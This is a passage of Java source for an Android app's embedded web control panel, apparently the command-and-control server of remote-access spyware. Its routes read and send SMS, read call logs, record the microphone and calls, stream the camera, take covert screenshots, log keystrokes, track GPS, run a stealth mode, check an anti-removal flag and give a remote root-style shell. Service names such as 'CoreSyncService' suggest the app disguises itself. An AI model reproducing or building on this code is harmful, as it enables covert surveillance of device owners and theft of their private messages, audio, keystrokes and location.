            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
            "@media (max-width: 480px) {" +
            "  .login-card { padding: 35px 20px; }" +
            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
            "  input { padding: 14px !important; font-size: 14px !important; }" +
            "  button { padding: 14px !important; font-size: 14px !important; }" +
            "}" +
            "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
            "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
            "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
            ".login-card img { transition: all 0.5s; }" +
            ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: drop-shadow(0 0 30px rgba(0, 242, 255, 1.0)); }" +
            "</style></head><body>" +
            "<div class=\"login-card\">" +
            "<img src=\"/logo?v=145\" style=\"width: 115px; height: 115px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.8)); border-radius: 50%; background: transparent !important;\">" +
            "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.4.5</div>" +
            "<form onsubmit=\"handleLogin(event)\">" +
            "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
            "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
            "</form>" +
            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's that MIND don't matter... The one's that MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
            "</div>" +
            "</div>" +
            "<script>" +
            "async function handleLogin(e) {" +
            "  e.preventDefault();" +
            "  const pass = document.getElementById('password').value;" +
            "  const header = document.getElementById('status-header');" +
            "  const btn = document.getElementById('uplink-btn');" +
            "  btn.disabled = true; btn.style.opacity = '0.5';" +
            "  try {" +
            "    const response = await fetch('/login', {" +
            "      method: 'POST'," +
            "      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }," +
            "      body: 'password=' + encodeURIComponent(pass) + '&json=true'" +
            "    });" +
            "    const data = await response.json();" +
            "    if (data.success) {" +
            "      header.textContent = 'ACCESS_GRANTED';" +
            "      header.style.color = '#39ff14';" +
            "      header.style.textShadow = '0 0 25px #39ff14';" +
            "      setTimeout(() => { window.location.href = '/?auth=' + Date.now(); }, 1000);" +
            "    } else {" +
            "      header.textContent = 'INCORRECT_PASSWORD';" +
            "      header.style.color = '#ff3131';" +
            "      header.style.textShadow = '0 0 25px #ff3131';" +
            "      btn.disabled = false; btn.style.opacity = '1';" +
            "      setTimeout(() => {" +
            "        header.textContent = 'RESTRICTED_ACCESS';" +
            "        header.style.color = '#00f2ff';" +
            "        header.style.textShadow = '0 0 15px rgba(0,242,255,0.6)';" +
            "      }, 2000);" +
            "    }" +
            "  } catch (err) {" +
            "    console.error(err);" +
            "    btn.disabled = false; btn.style.opacity = '1';" +
            "  }" +
            "}" +
            "</script></body></html>";

    private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>UPLINK | LOGOUT</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
            "<style>" +
            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
            "body { background: #050505; color: #ff3131; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
            ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); width: 90%; max-width: 400px; }" +
            "h1 { font-size: 1.8rem; }" +
            "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 1.3rem; } p { font-size: 0.8rem; } }" +
            "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
            ".login-card img { transition: all 0.5s; }" +
            ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: drop-shadow(0 0 30px rgba(0, 242, 255, 1.0)); }" +
            "</style></head><body>" +
            "<div class=\"logout-card\">" +
            "<h1>SESSION_TERMINATED</h1>" +
            "<p>Uplink severed. Disconnecting...</p>" +
            "</div>" +
            "<script>" +
            "  // Nuclear Session Wipe\n" +
            "  document.cookie = 'token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';\n" +
            "  localStorage.clear();\n" +
            "  sessionStorage.clear();\n" +
            "  setTimeout(() => { window.location.href = '/login'; }, 1500);\n" +
            "</script></body></html>";

    private static volatile String sessionToken = "";

    public LabRatsHttpServer(Context context, int port) {
        super(port);
        this.context = context;
        staticContext = context.getApplicationContext();
        
        // Multi-Threaded Executor: Allows handling multiple C2 requests at once
        // Prevents UI stuttering while downloading large files from the Data tab
        setAsyncRunner(new DefaultAsyncRunner());

        // Generate a fresh session token for this server lifetime
        // Ensures "every reload requires a login" for security
        sessionToken = java.util.UUID.randomUUID().toString();

        LabRatsWorker.execute(this::loadPersistentData);
    }

    @Override
    public Response serve(IHTTPSession session) {
        String uri = session.getUri();
        Response response;
        CookieHandler cookies = session.getCookies();
        
        try {
            // 1. Handle Login POST (Always available)
            if (uri.equals("/login") && session.getMethod() == Method.POST) {
                session.parseBody(new HashMap<>());
                String pass = session.getParms().get("password");
                boolean isJson = "true".equals(session.getParms().get("json"));
                
                if (pass != null && getStoredPassword().equals(pass.trim())) {
                    logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
                    if (isJson) {
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/?auth=" + System.currentTimeMillis());
                    }
                    response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
                } else {
                    if (isJson) {
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
                    } else {
                        response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
                    }
                }
            } 
            // 2. Handle Logout (Hard kill session)
            else if (uri.equals("/logout")) {
                logActivity("AUTHENTICATION_TERMINATED: Session closed");
                // Invalidate persistent server token immediately
                sessionToken = java.util.UUID.randomUUID().toString(); 
                context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                    .edit().putString("session_token", sessionToken).apply();
                
                response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGOUT_HTML);
                // Nuclear cookie wipe
                response.addHeader("Set-Cookie", "token=deleted; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict");
            }
            // 3. Auth Check for all other pages
            else {
                String token = cookies.read("token");
                // Strict equality check against the CURRENT server-side UUID
                boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));

                if (!isLoggedIn) {
                    if (uri.equals("/logo")) {
                        response = serveLogo();
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont();
                    } else {
                        logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
                        // For assets, return 401. For pages, return login wall.
                        if (uri.contains(".") && !uri.equals("/")) {
                            response = newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "ACCESS_DENIED_REAUTHENTICATE");
                        } else {
                            response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
                        }
                    }
                } else {
                    // Logged in: Process standard routes
                    Map<String, String> params = session.getParms();
                    
                    if (uri.equals("/login")) {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/");
                    } else if (uri.equals("/") || uri.isEmpty()) {
                        response = serveHome();
                    } else if (uri.equals("/logo")) {
                        response = serveLogo();
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont();
                    } else if (uri.equals("/device")) {
                        response = serveDeviceInfo();
                    } else if (uri.equals("/device/vibrate")) {
                        vibrateDevice();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/max-volume")) {
                        setMaxVolume();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/silent-mode")) {
                        setSilentMode();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/open-url")) {
                        openUrlOnDevice(params.get("url"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/toast")) {
                        showToast(params.get("msg"));
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/apps")) {
                        response = serveAppList();
                    } else if (uri.equals("/device/self-destruct")) {
                        selfDestruct();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/device/shell")) {
                        String cmd = params.get("cmd");
                        boolean termuxAvailable = isAppInstalled("com.termux");
                        String shellResult = executeShell(cmd);
                        
                        try {
                            org.json.JSONObject resultObj = new org.json.JSONObject();
                            resultObj.put("output", shellResult);
                            resultObj.put("termux_available", termuxAvailable);
                            response = newFixedLengthResponse(Response.Status.OK, "application/json", resultObj.toString());
                        } catch (Exception e) {
                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"output\": \"JSON Error\", \"termux_available\": false}");
                        }
                    } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                        response = serveFiles(uri, params);
                    } else if (uri.equals("/calls")) {
                        response = serveCallLogs(params);
                    } else if (uri.equals("/calls/make")) {
                        response = makeCall(params);
                    } else if (uri.equals("/calls/clear")) {
                        response = serveCallLogsClear();
                    } else if (uri.equals("/sms")) {
                        response = serveSmsMessages(params);
                    } else if (uri.equals("/mms")) {
                        response = serveMmsMessages(params);
                    } else if (uri.equals("/mms/send")) {
                        response = sendMms(session);
                    } else if (uri.startsWith("/mms/media/")) {
                        response = serveMmsMedia(uri.substring(11));
                    } else if (uri.equals("/sms/send")) {
                        response = sendSms(params);
                    } else if (uri.equals("/sms/broadcast")) {
                        response = serveSmsBroadcast(params);
                    } else if (uri.equals("/contacts")) {
                        response = serveContacts(params);
                    } else if (uri.equals("/camera")) {
                        response = serveCameraPage();
                    } else if (uri.equals("/camera/capture")) {
                        response = serveCameraCapture(params);
                    } else if (uri.equals("/camera/photo")) {
                        response = serveCameraPhoto(params);
                    } else if (uri.equals("/camera/live")) {
                        response = serveLiveStreamPage(params);
                    } else if (uri.equals("/camera/stream")) {
                        response = serveMJPEGStream(params);
                    } else if (uri.equals("/camera/frame")) {
                        response = serveSingleFrame();
                    } else if (uri.equals("/camera/start-stream")) {
                        response = startCameraStream(params);
                    } else if (uri.equals("/camera/stop-stream")) {
                        response = stopCameraStream();
                    } else if (uri.equals("/camera/record")) {
                        response = startVideoRecording(params);
                    } else if (uri.equals("/camera/stop-record")) {
                        response = stopVideoRecording();
                    } else if (uri.equals("/camera/status")) {
                        response = serveCameraStatus();
                    } else if (uri.equals("/terminal/restart")) {
                        logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent intent = new Intent(context, CoreSyncService.class);
                            intent.setAction("START");
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                context.startForegroundService(intent);
                            } else {
                                context.startService(intent);
                            }
                        }, 500);
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/terminal/clear-logs")) {
                        systemLogs.clear();
                        saveLogsInternal();
                        logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/terminal/logs")) {
                        org.json.JSONArray array = new org.json.JSONArray();
                        List<String> logsCopy;
                        synchronized (systemLogs) {
                            logsCopy = new java.util.ArrayList<>(systemLogs);
                        }
                        for (String log : logsCopy) {
                            array.put(log);
                        }
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", array.toString());
                    } else if (uri.equals("/gps")) {
                        response = serveGpsPage();
                    } else if (uri.equals("/gps/locate")) {
                        response = serveGpsLocate(params);
                    } else if (uri.equals("/intel")) {
                        response = serveIntel(params);
                    } else if (uri.equals("/intel/clear")) {
                        StatusNotification.clearHistory(context);
                        logActivity("SYSTEM_MAINTENANCE: Intel history purged");
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.startsWith("/files/edit/")) {
                        response = serveFileEdit(uri.substring(12));
                    } else if (uri.equals("/files/save")) {
                        response = saveFile(session);
                    } else if (uri.equals("/camera/night-mode")) {
                        response = toggleNightMode();
                    } else if (uri.equals("/stealth")) {
                        response = toggleStealthMode(params);
                    } else if (uri.equals("/settings/password")) {
                        response = updatePassword(session);
                    } else if (uri.startsWith("/download/")) {
                        response = serveDownload(uri);
                    } else if (uri.equals("/audio")) {
                        response = serveAudioPage();
                    } else if (uri.equals("/audio/mic/start")) {
                        response = startMicRecording(params);
                    } else if (uri.equals("/audio/mic/stop")) {
                        response = stopMicRecording();
                    } else if (uri.equals("/audio/call/start")) {
                        response = startCallRecording(params);
                    } else if (uri.equals("/audio/call/stop")) {
                        response = stopCallRecording();
                    } else if (uri.equals("/audio/status")) {
                        response = serveAudioStatus();
                    } else if (uri.equals("/audio/settings")) {
                        response = updateAudioSettings(params);
                    } else if (uri.equals("/audio/recordings")) {
                        response = serveAudioRecordings();
                    } else if (uri.equals("/ghost")) {
                        response = serveGhostPage();
                    } else if (uri.equals("/ghost/keys")) {
                        response = serveKeystrokes();
                    } else if (uri.equals("/ghost/clear")) {
                        AccessibilityCore.clearKeystrokes();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/ghost/screenshot")) {
                        response = serveCovertScreenshot();
                    } else if (uri.equals("/ghost/status")) {
                        boolean active = AccessibilityCore.getInstance() != null;
                        boolean antiRemoval = AccessibilityCore.isAntiRemovalEnabled();
                        boolean blackout = AccessibilityCore.isBlackoutActive();
                        boolean lock = AccessibilityCore.isLockActive();
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + ", \"blackout\": " + blackout + ", \"lock\": " + lock + "}");
                    } else if (uri.equals("/ghost/lock")) {
                        AccessibilityCore ghost = AccessibilityCore.getInstance();
                        if (ghost != null) {
                            ghost.setRemoteLock(!AccessibilityCore.isLockActive());
                        }
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                    } else if (uri.equals("/ghost/interact")) {
                        response = performInteraction(params);
                    } else {
                        response = serve404();
                    }
                }
            }
        } catch (Exception e) {
            response = serveError(e.getMessage());
        }

        // Global Anti-Cache Lockdown (Exclude assets and data streams to prevent flickering)
        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/") && !uri.equals("/ghost/screenshot") && !uri.equals("/camera/frame")) {
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
        }
        return response;
    }

    private Response serveLogo() {
        try {
            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.drawable.app_logo);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "public, max-age=31536000, immutable");
            return response;
        } catch (Exception e) {
            return serveError("Logo error: " + e.getMessage());
        }
    }

    private Response serveFont() {
        try {
            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.font.orbitron);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Log.d("LabRATS-Server", "Serving font 'Orbitron' - size: " + bytes.length);
            Response response = newFixedLengthResponse(Response.Status.OK, "font/ttf", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "no-cache, must-revalidate");
            response.addHeader("Access-Control-Allow-Origin", "*");
            return response;
        } catch (Exception e) {
            logActivity("SYSTEM_ERROR: Font serving failed: " + e.getMessage());
            return serveError("Font error: " + e.getMessage());
        }
    }

    private Response serveHome() {
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
        String sessionId = sessionToken.substring(0, 4).toUpperCase();

        StringBuilder html = new StringBuilder(HTML_HEADER);
        
        // Status Monitor Card
        html.append("<div class=\"card\">");
        html.append("<div style=\"margin-bottom: 25px;\">");
        String snifferStatus = StatusNotification.isServiceRunning() ? 
            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
        html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-top:8px;\">SESSION_ID: ").append(sessionId).append("</div>");
        html.append("</div>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
        
        // Server Status
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
        // Status: Green ONLINE if running, Red DOWN otherwise. Since we are serving this, it's ONLINE.
        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green);\">ONLINE</div>");
        html.append("</div>");
        
        // Port
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">ACCESS_PORT</div>");
        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">8080</div>");
        html.append("</div>");
        
        // IP
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all;\">").append(ipDisplay).append("</div>");
        html.append("</div>");
        
        html.append("</div>");
        html.append("</div>");

        // --- REMOTE SHELL TERMINAL SECTION ---
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-cyan);\">REMOTE_SHELL_TERMINAL</h3>");
        
        html.append("<div style=\"background: #000; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); overflow: hidden; margin-top: 15px;\">");
        html.append("<div id=\"shell-output\" style=\"padding: 20px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace; height: 350px; overflow-y: auto;\">");
        html.append("<div>[STABILITY_OS] Initializing remote session...</div>");
        html.append("<div>[UPLINK] Connected to /dev/pts/0</div>");
        html.append("<div id=\"termux-uplink\" style=\"color: var(--neon-yellow); display: none;\">[UPLINK] Termux bridge available.</div>");
        html.append("<div style=\"opacity: 0.5; margin-top: 5px;\">Type 'help' for command list</div>");
        html.append("</div>");

        html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
        html.append("<span style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:~#</span>");
        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
        html.append("</div>");
        html.append("</div>");

        html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: flex-start; gap: 10px; flex-wrap: wrap;\">");
        html.append("<button onclick=\"executeShell()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin:0;\">EXECUTE</button>");
        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"btn btn-small\" style=\"border-color: #333; color: #888; margin:0;\">CLEAR_SCREEN</button>");
        html.append("</div>");

        html.append("<script>");
        html.append("  let commandHistory = [];");
        html.append("  let historyIndex = -1;");

        html.append("  document.getElementById('shell-cmd').addEventListener('keydown', function(e) {");
        html.append("    if (e.key === 'ArrowUp') {");
        html.append("      e.preventDefault();");
        html.append("      if (historyIndex < commandHistory.length - 1) {");
        html.append("        historyIndex++;");
        html.append("        this.value = commandHistory[commandHistory.length - 1 - historyIndex];");
        html.append("      }");
        html.append("    } else if (e.key === 'ArrowDown') {");
        html.append("      e.preventDefault();");
        html.append("      if (historyIndex > 0) {");
        html.append("        historyIndex--;");
        html.append("        this.value = commandHistory[commandHistory.length - 1 - historyIndex];");
        html.append("      } else if (historyIndex === 0) {");
        html.append("        historyIndex = -1;");
        html.append("        this.value = '';");
        html.append("      }");
        html.append("    } else if (e.key === 'Enter') {");
        html.append("      executeShell();");
        html.append("    }");
        html.append("  });");

        html.append("  function executeShell() {");
        html.append("    const input = document.getElementById('shell-cmd');");
        html.append("    const c = input.value;");
        html.append("    const out = document.getElementById('shell-output');");
        html.append("    if(!c) return;");

        html.append("    commandHistory.push(c);");
        html.append("    if(commandHistory.length > 50) commandHistory.shift();");
        html.append("    historyIndex = -1;");
        html.append("    const line = document.createElement('div');");
        html.append("    line.style.color = '#fff'; line.style.marginTop = '10px';");
        html.append("    line.innerHTML = '<span style=\"color:var(--terminal-green)\">root@Android:~#</span> ' + c;");
        html.append("    out.appendChild(line);");
        html.append("    input.value = '';"); // Clear immediately for better feel
        html.append("    fetch('/device/shell?cmd=' + encodeURIComponent(c)).then(r => r.json()).then(d => {");
        html.append("      if (d.termux_available) document.getElementById('termux-uplink').style.display = 'block';");
        html.append("      const resp = document.createElement('div');");
        html.append("      resp.style.whiteSpace = 'pre-wrap';");
        html.append("      resp.innerHTML = d.output || 'No output';");
        html.append("      out.appendChild(resp);");
        html.append("      out.scrollTop = out.scrollHeight;");
        html.append("    }).catch(e => {");
        html.append("      const err = document.createElement('div');");
        html.append("      err.style.color = 'var(--danger)';");
        html.append("      err.textContent = '[ERROR] Connection lost';");
        html.append("      out.appendChild(err);");
        html.append("    });");
        html.append("  }");
        html.append("  document.getElementById('shell-cmd').addEventListener('keypress', function(e) { if(e.key === 'Enter') executeShell(); });");
        html.append("</script>");

        // --- DEVICE COMMANDS CARD ---
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-cyan);\">DEVICE_COMMANDS</h3>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 250px)); gap: 15px; margin-top: 20px;\">");
        
        html.append("<button onclick=\"deviceCmd('vibrate')\" class=\"btn btn-small\" style=\"margin:0;\">&#128243; VIBRATE</button>");
        html.append("<button onclick=\"deviceCmd('max-volume')\" class=\"btn btn-small\" style=\"margin:0;\">&#128266; MAX_VOLUME</button>");
        html.append("<button onclick=\"deviceCmd('silent-mode')\" class=\"btn btn-small\" style=\"margin:0;\">&#128263; SILENT_MODE</button>");
        
        html.append("</div>");
        html.append("<div style=\"margin-top: 20px;\">");
        html.append("<div class=\"info-label\">FORCE_OPEN_URL:</div>");
        html.append("<div style=\"display: flex; gap: 10px; margin-top: 8px; max-width: 600px;\">");
        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 8px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1;\">");
        html.append("<button onclick=\"openUrl()\" class=\"btn btn-small\" style=\"margin:0; border-color: var(--neon-cyan); color: var(--neon-cyan);\">EXECUTE</button>");
        html.append("</div></div>");
        
        html.append("<div style=\"margin-top: 20px;\">");
        html.append("<div class=\"info-label\">SEND_SYSTEM_TOAST:</div>");
        html.append("<div style=\"display: flex; gap: 10px; margin-top: 8px; max-width: 600px;\">");
        html.append("<input id=\"toast-msg\" type=\"text\" placeholder=\"Message Content\" style=\"background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 8px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1;\">");
        html.append("<button onclick=\"sendToast()\" class=\"btn btn-small\" style=\"margin:0; border-color: var(--neon-yellow); color: var(--neon-yellow);\">SEND_TOAST</button>");
        html.append("</div></div>");
        html.append("<script>");
        html.append("  function deviceCmd(a) { fetch('/device/' + a); }");
        html.append("  function openUrl() { const u = document.getElementById('target-url').value; if(u) fetch('/device/open-url?url=' + encodeURIComponent(u)); }");
        html.append("</script>");
        html.append("</div>");

        // Security Settings Card
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
        html.append("<h3 class=\"password-title\" style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">CHANGE_INTERFACE_PASSWORD</h3>");
        html.append("<div style=\"margin-top: 15px;\">");
        html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display: flex; gap: 10px; align-items: center; flex-wrap: wrap;\">");
        html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_PASSWORD\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1; max-width: 450px; min-width: 200px;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); padding: 10px 20px; font-size: 0.7rem;\">CHANGE_PASSWORD</button>");
        html.append("</form>");
        html.append("</div>");
        html.append("</div>");

        // System Control Section
        html.append("<div class=\"action-row-limited\" style=\"margin-top: 40px; display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 60px;\">");
        html.append("<button onclick=\"selfDestruct()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255,49,49,0.05);\">&#128163; SELF_DESTRUCT</button>");
        html.append("<button onclick=\"restartServer()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05);\">RESTART SERVER</button>");
        html.append("<form action=\"/logout\" method=\"POST\" style=\"margin:0;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">TERMINATE_SESSION</button>");
        html.append("</form>");
        html.append("</div>");

        html.append("<script>");
        html.append("  function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }");
        html.append("  function sendToast() { const m = document.getElementById('toast-msg').value; if(m) fetch('/device/toast?msg=' + encodeURIComponent(m)); }");
        html.append("  function selfDestruct() { if(confirm('CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?')) fetch('/device/self-destruct'); }");
        html.append("</script>");


        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveDeviceInfo() {
        logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
